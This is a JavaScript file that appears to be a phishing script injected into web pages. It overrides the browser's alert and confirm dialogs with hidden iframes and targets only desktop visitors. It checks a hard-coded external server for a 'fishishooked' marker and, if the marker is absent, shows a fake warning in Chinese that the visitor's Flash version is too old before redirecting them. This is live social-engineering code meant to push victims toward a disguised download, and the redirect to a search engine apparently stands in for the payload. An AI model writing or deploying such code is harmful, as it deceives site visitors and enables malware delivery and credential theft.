window.alert = function(name){
var iframe = document.createElement("IFRAME");
iframe.style.display="none";
iframe.setAttribute("src", 'data:text/plain,');
document.documentElement.appendChild(iframe);
window.frames[0].window.alert(name);
iframe.parentNode.removeChild(iframe);
}

window.confirm = function(name){
var iframe = document.createElement("IFRAME");
iframe.style.display="none";
iframe.setAttribute("src", 'data:text/plain,');
document.documentElement.appendChild(iframe);
var result = window.frames[0].window.confirm(name);
iframe.parentNode.removeChild(iframe);
return result;
}

function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
        return false;
    } else {
        return true;
    }
}

function isRise() {
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    // xmlHttp.open("GET", "http://127.0.0.1/fish/api.php?m=api&do=isExist", "true");
    xmlHttp.open("GET", "http://39.108.181.144:61262/index.php/admins/Index/index", "true");

    xmlHttp.send();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var resData = xmlHttp.responseText;
            // console.log(resData);

            var res = resData.search("fishishooked");
            console.log(res);
            if (res!='-1') {
            } else {
                download();
            }
        }
    }
}

function download(){
    window.alert = function(name){var iframe = document.createElement("IFRAME");iframe.style.display="none";iframe.setAttribute("src", 'data:text/plain,');
    document.documentElement.appendChild(iframe);window.frames[0].window.alert(name);iframe.parentNode.removeChild(iframe);};
    // alert("您的什么");
    
    alert("您的FLASH版本过低，请尝试升级后访问该页面");
    window.location.href="https://www.baidu.com/";
}

window.onload = function(){
    if(!isPc()){
        alert("当前页面只能在电脑PC端中加载,请稍后重试...");
    }else{
        isRise();
    }
}